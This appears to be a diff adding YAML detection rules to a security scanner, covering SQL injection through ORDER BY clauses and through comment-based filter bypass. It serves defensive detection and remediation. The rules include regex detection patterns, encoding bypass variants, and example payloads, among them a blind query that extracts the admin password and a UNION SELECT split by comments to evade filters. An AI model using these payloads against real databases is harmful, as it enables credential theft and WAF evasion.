+    - ORDER\s+BY\s+['"]?\s*\+\s*\w+\s*\+\s*['"]?
+    - QUOTENAME
+    taint_source_indicators:
+    - request\.query\.(?:sort|order|sortBy|orderBy)
+    - \$_GET\[.(?:sort|order).\]
+    - params\.get\(.(?:sort|order).\)
+    - req\.query\.sort
+    taint_sink_indicators:
+    - ORDER\s+BY
+    - cursor\.execute\(
+    - connection\.query\(
+    - Statement\.executeQuery\(
+    sanitization_patterns:
+    - QUOTENAME
+    - whitelist validation
+    - allowedColumns check
+    - enum validation
+    - switch/case for column mapping
+  severity_scoring:
+    severity_weight: 7
+    risk_score_formula_hint: severity_weight * confidence * injection_depth_factor
+    exploitability_score: Medium
+  exploit_scenario:
+    attack_example: 'A product listing at /api/products?sort=price&dir=ASC constructs: SELECT * FROM products ORDER BY price
+      ASC. The attacker submits sort=(CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users WHERE username=''admin'')=''a''
+      THEN price ELSE name END) -- The sort order changes based on whether the first character of the admin password is ''a'',
+      enabling boolean-based blind extraction through sort behavior.
+
+      '
+    example_payload: (CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' THEN price ELSE name
+      END)--
+    attacker_objective: Exploit ORDER BY clause to enumerate columns, infer data through conditional sorting, or achieve full
+      SQL injection via subqueries.
+  confidence_factors:
+    pattern_strength: medium
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  impact: 'ORDER BY injection enables column count enumeration (prerequisite for UNION
+
+    attacks), boolean-based data inference through conditional sort behavior,
+
+    and in some cases full SQL injection through subqueries or error-based
+
+    techniques within the ORDER BY clause. It is a common vector because
+
+    column identifiers cannot be parameterized.
+
+    '
+  remediation: "Whitelist Validation:\n\n  Node.js:\n    const allowedColumns = ['price', 'name', 'created_at'];\n    const\
+    \ sort = allowedColumns.includes(req.query.sort) ? req.query.sort : 'id';\n\n  SQL Server (QUOTENAME):\n    SET @sql =\
+    \ N'SELECT * FROM products ORDER BY ' + QUOTENAME(@sortColumn);\n    -- Plus: validate @sortColumn against a whitelist\n\
+    \n  Python:\n    ALLOWED_SORTS = {'price', 'name', 'created_at'}\n    sort_col = sort_input if sort_input in ALLOWED_SORTS\
+    \ else 'id'\n    cursor.execute(f\"SELECT * FROM products ORDER BY {sort_col}\")\n\nPrevention:\n  - Never directly concatenate\
+    \ user input into ORDER BY\n  - Maintain a strict whitelist of allowed sort columns\n  - Map user-provided sort keys to\
+    \ safe column names via a dictionary/enum\n  - Use QUOTENAME() (SQL Server) as defense-in-depth\n  - Validate sort direction\
+    \ is only ASC or DESC\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/89.html
+  - https://portswigger.net/web-security/sql-injection
+  - https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: medium
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - SQL-INJ-001
+    - SQL-INJ-002
+    - SQL-INJ-008
+- rule_id: SQL-INJ-010
+  title: Comment-Based SQL Filter Bypass
+  description: 'Detects SQL injection techniques that use SQL comments to bypass input filters, WAFs, and keyword detection.
+    Covers inline comments (/* */), MySQL version comments (/*!...*/), single-line comments (-- and #), and comment insertion
+    between SQL keywords to evade tokenization-based detection. These techniques are commonly used to bypass basic SQL injection
+    filters that match on keyword adjacency.
+
+    '
+  language: sql
+  category: injection
+  severity: High
+  confidence: 0.87
+  cwe: CWE-89
+  owasp: A03:2021-Injection
+  tags:
+  - comment-bypass
+  - waf-evasion
+  - filter-bypass
+  - inline-comment
+  - version-comment
+  - obfuscation
+  detection_layer: 2
+  attack_surface_type: api
+  patterns:
+  - type: regex
+    pattern: (?i)\/\*.*\*\/\s*(?:UNION|SELECT|INSERT|UPDATE|DELETE|DROP|OR|AND)
+  - type: regex
+    pattern: (?i)(?:UNION|SELECT|INSERT|UPDATE|DELETE|DROP)\s*\/\*.*\*\/\s*(?:UNION|SELECT|INSERT|UPDATE|DELETE|DROP|ALL|FROM)
+  - type: regex
+    pattern: (?i)\/\*![0-9]*\s*(?:SELECT|UNION|INSERT|UPDATE|DELETE|DROP)
+  - type: regex
+    pattern: (?i)(?:UNION|SELECT|OR|AND)\s*--\s*\n\s*(?:SELECT|FROM|WHERE)
+  - type: regex
+    pattern: (?i)#\s*\n\s*(?:SELECT|UNION|INSERT|UPDATE|DELETE|DROP|OR|AND)
+  - type: regex
+    pattern: (?i)UN\/\*\*\/ION\s+SE\/\*\*\/LECT
+  - type: regex
+    pattern: (?i)\/\*\*\/(?:OR|AND|UNION|SELECT)\/\*\*\/
+  anti_patterns:
+  - -- migration
+  - -- legitimate comment
+  - /* copyright */
+  - /* eslint */
+  - /* jshint */
+  - /* istanbul */
+  - PreparedStatement
+  - parameterized
+  - \/\*\s*TODO
+  - \/\*\s*FIXME
+  - \/\*\s*NOTE
+  - -- flyway
+  - -- liquibase
+  - -- alembic
+  - legitimate SQL comment
+  bypass_variants:
+  - pattern: (?i)UNI%4FN%20SE%4CECT
+    description: Partial URL encoding of keywords combined with comment insertion
+  - pattern: (?i)\/\*!50000\s*UNION\s*\*\/\s*\/\*!50000\s*SELECT\s*\*\/
+    description: MySQL version-conditional comments to execute SQL only on specific MySQL versions
+  - pattern: (?i)0x554e494f4e0x53454c454354
+    description: Full hex encoding of UNION SELECT keywords to bypass text-based filters
+  evasion_indicators:
+  - comment insertion between SQL keyword characters
+  - MySQL version comments with version numbers
+  - alternating inline comments and keywords
+  - newline after single-line comment to continue injection
+  - nested comments on databases that support them
+  - combining URL encoding with comment injection
+  encoding_variants:
+  - /**/ between every keyword
+  - /*!50000 ... */ MySQL version comment
+  - -- \n continuation
+  - '# \n continuation'
+  multi_function_chain_patterns:
+  - /**/UNION/**/SELECT (keyword splitting for WAF bypass)
+  - /*!UNION*/ /*!SELECT*/ (MySQL version comments for selective execution)
+  - --\nUNION\n--\nSELECT (line comment interleaving)
+  privilege_context_flags:
+  - No special privileges needed
+  - Technique is WAF/filter bypass, not privilege-dependent
+  - Underlying injection determines required privileges
+  business_logic_indicator:
+  - Any endpoint with WAF or input filter protecting against SQL injection
+  - Endpoints that strip or reject known SQL keywords
+  - Applications with custom SQL injection filters
+  probable_taint_paths:
+  - source: request.query parameter
+    through: custom SQL keyword filter (incomplete)
+    sink: cursor.execute()
+  - source: request.body field
+    through: WAF bypass
+    sink: db.query()
+  - source: URL parameter
+    through: regex-based SQL filter (evaded by comments)
+    sink: Statement.executeQuery()
+  context_awareness:
+    surrounding_context_patterns:
+    - WHERE\s+\w+\s*=\s*['"]?\{\{.*\}\}['"]?
+    - \/\*.*\*\/.*(?:SELECT|UNION|OR|AND)
+    - str\.replace.*(?:UNION|SELECT|DROP)
+    - blacklist.*(?:UNION|SELECT|DROP)
+    taint_source_indicators:
+    - request\.(?:params|query|body)\[
+    - \$_(?:GET|POST|REQUEST)\[
+    - HttpServletRequest\.getParameter\(
+    - req\.(?:body|query|params)
+    taint_sink_indicators:
+    - cursor\.execute\(
+    - connection\.query\(
+    - Statement\.executeQuery\(
+    - PDO::query\(
+    - db\.rawQuery\(
+    sanitization_patterns:
+    - prepared_statement
+    - parameterized query
+    - ORM query builder
+    - whitelist validation only
+    - strict type checking
+  severity_scoring:
+    severity_weight: 7
+    risk_score_formula_hint: severity_weight * confidence * filter_bypass_success_rate
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A web application has a custom filter that blocks requests containing "UNION SELECT" as adjacent words.
+      The attacker bypasses this by submitting: /products?id=1 UN/**/ION SE/**/LECT username,password,3 FROM users-- The inline
+      comments split the keywords, bypassing the filter, but the database ignores the comments and executes the UNION SELECT
+      normally.
+
+      '
+    example_payload: 1 UN/**/ION SE/**/LECT username,password,3 FROM users--
+    attacker_objective: Bypass SQL injection filters, WAFs, and keyword blacklists using SQL comment syntax to execute otherwise
+      blocked injection payloads.
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: medium
+  impact: 'Comment-based bypasses render keyword-based SQL injection filters ineffective.
+
+    Once the filter is bypassed, the attacker can execute any SQL injection
+
+    technique (UNION, stacked queries, blind injection) with full impact. This
+
+    technique is commonly used against WAFs and custom input filters, making
+
+    defense-in-depth critical.
+
+    '
+  remediation: "Parameterized Queries (primary defense):\n  - Use parameterized queries/prepared statements exclusively\n\
+    \  - Comments bypass keyword filters but NOT parameterized queries\n  - Never rely solely on input filtering for SQL injection\
+    \ prevention\n\nWAF Configuration:\n  - Configure WAF to detect comment patterns within SQL contexts\n  - Enable comment\
+    \ normalization (strip comments before analysis)\n  - Use semantic SQL parsing instead of regex-based detection\n  - Block\
+    \ requests containing /**/ or /*!...*/ in query parameters\n\nFilter Hardening (defense-in-depth only):\n  - Normalize\
+    \ input by stripping comments before keyword matching\n  - Use SQL tokenizer instead of regex for keyword detection\n\
+    \  - Implement whitelist validation instead of blacklist filtering\n  - Detect hex encoding, URL encoding, and mixed-case\
+    \ evasion\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/89.html
+  - https://portswigger.net/web-security/sql-injection/bypassing-filters
+  - https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - SQL-INJ-001
+    - SQL-INJ-004
+    - SQL-INJ-002
